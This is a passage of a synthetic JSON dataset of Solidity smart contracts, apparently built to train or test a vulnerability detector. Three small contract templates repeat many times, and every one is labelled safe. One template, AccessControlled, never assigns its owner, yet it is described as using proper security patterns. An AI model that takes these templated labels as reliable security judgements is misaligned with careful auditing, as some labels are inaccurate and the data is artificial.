    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 452",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 453",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 454",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 455",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 456",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 457",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 458",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 459",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 460",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 461",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 462",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 463",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 464",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 465",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 466",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 467",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 468",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 469",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 470",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 471",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 472",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 473",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 474",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 475",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 476",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 477",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 478",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 479",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 480",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 481",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
